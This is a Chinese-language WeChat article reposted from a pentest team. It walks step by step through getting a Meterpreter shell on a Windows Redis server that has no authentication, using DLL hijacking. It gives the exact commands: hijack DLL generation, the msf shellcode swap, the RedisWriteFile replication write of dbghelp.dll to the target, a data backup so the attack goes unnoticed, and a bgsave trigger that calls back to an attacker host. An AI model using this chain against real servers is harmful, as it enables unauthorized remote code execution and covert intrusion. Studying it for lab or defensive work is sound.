#  Windows中redis未授权通过dll劫持上线

[ 嗨嗨安全 ](javascript:void\(0\);)

**嗨嗨安全** ![]()

微信号 natuerhi666

功能介绍 提供网络安全资料与工具,分享攻防实战经验和思路。

____

___发表于_

以下文章来源于雁行安全团队 ，作者蜻蜓队长

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM4hsumLj16fhczZvOSHlbRicEQCt0kMLN6d8DMBr4gzpcw/0)
**雁行安全团队** .

四叶草安全雁行安服团队—黑客与POC的火花

# 前言

项目中时不时会遇到windows的redis未授权，利用dll劫持可以不用重启获取shell。本文参考网上师傅们的文章详细复现了过程，供各位才入坑的朋友们参考。

# 前期准备

## 环境

攻击机：192.168.41.38 win10 默认安装 Redis 3.2.100

目标机：192.168.41.29 win2012 默认安装Redis 3.2.100

回连主机：192.168.41.19，msf shellcode

## 工具准备

dll_hijack

https://github.com/JKme/sb_kiddie-/tree/master/hacking_win/dll_hijack

RedisWrite

https://github.com/r35tart/RedisWriteFile

redis-dump-go

https://github.com/yannh/redis-dump-go

visual studio 2019 微软官网下载

## 安装redis

攻击机和目标机都采用默认安装，Redis Service会开机自启，权限为Network Service ，对默认目录是拥有完全控制权限的。

![]()

![]()

![]()

修改redis.windows-service.conf，默认绑定地址是127.0.0.1，修改成0.0.0.0，重启一下。

![]()

# 寻找DLL劫持目标

简而言之，使用Process Monitor，在redis-cli操作的时候，查看哪些DLL缺失，以符合dll劫持的特征。

在Process Monitor Filter里面设置Image Path的值为redis-
server.exe的路径，根据实际情况来，比如我这里的是C:\Program Files\Redis\redis-
server.exe，Path设置为ends with dll。

![]()

![]()

![]()

设置好之后，使用redis-cli连接，按照前人大佬们的经验，直接执行bgsave命令，然后观察缺失的dll，有如下:

![]()

C:\Program Files\Redis\dbghelp.dll

C:\Windows\System32\symsrv.dll

symsrv.dll要在系统目录去调用，完全可以不考虑。而dbghelp.dll在当前路径即可，因此选择dbghelp.dll作为劫持目标。

除了使用bgsave，其他的操作也能触发其他的dll，这里就不作深入研究，站在前人肩膀上就行了。

dbghelp.dll恰好系统自带就有，我们可以直接拿来利用。

![]()

# 利用复现

先模拟一下内网中发现某台机器存在redis未授权。

![]()

在攻击机上使用redis-cli.exe连接。

redis-cli -h 192.168.41.29 -p 6379

连接后输入info可以看到运行路径。

![]()

使用jkme师傅的dll_hijack工具，生成DLL工程项目。

python3 DLLHijacker.py dbghelp.dll

![]()

生成后出现sln文件。

![]()

使用vs2019打开dbghelp.sln的dllmain.cpp文件，在如图所示位置将路径改为目标redis的运行路径。(就是刚才执行info后的路径)

![]()

用msf演示，生成shellcode。

![]()

继续在dllmain.cpp中，将原来的计算器shellcode替换成刚才生成的msf shellcode。

![]()

修改完毕保存，记得设置使用release格式。

![]()

![]()

![]()

![]()

使用RedisWriteFile将修改后的dbghelp.dll利用主从复制写入到目标的制定位置。

python3 RedisWriteFile.py --rhost=192.168.41.29 --rport=6379
--lhost=192.168.41.38 --rpath="C:/Program Files/Redis/" --rfile="dbghelp.dll"
--lfile="dbghelp.dll"

![]()

![]()

这里说下，为啥不直接主从复制获取shell。因为使用主从复制RCE的前提是需要关键模块MODULE
LOAD，这个是redis4.0以后才有的，而windows目前支持的最高版本是3.2。

jkme师傅还提到，使用RedisWriteFile写入文件的时候，因为使用的是主从复制，会把redis里面的数据清空，这样攻击之后可能会被发现。因此我们在之前可以先备份下。

redis-dump-go.exe -host 192.168.41.29 -output commands > redis.dump

![]()

备份完成，也把dll文件写入后，直接在redis未授权命令行上执行bgsave，然后恢复备份。

![]()

msf成功回连，劫持成功。

![]()

![]()

此时dbghelp.dll一直在执行中，除非停掉redis-server.exe才能删除。

![]()

此时重启redis的话会启动不起来直接停止，实战中拿到权限后需要考虑这个问题。

# 总结

  * 经测试redis安装目录不影响network serveice的完全控制权限，因此在不考虑shellcode免杀的情况下利用成功率高，几乎适用所有的windows。

  * 各个windows版本的dbghelp.dll之前有差异，建议使用目标系统相同的dll。

  * 经个人环境测试，发现该dll劫持方式不会影响redis运行，但是会影响redis重启，所以各位老板在使用时需要谨慎一点。

# 参考来源

https://xz.aliyun.com/t/8153

https://jkme.github.io/2020/09/10/redis-windows-hijack.html

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# Windows中redis未授权通过dll劫持上线

[ 嗨嗨安全 ](javascript:void\(0\);)

轻触阅读原文

![]()

嗨嗨安全

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

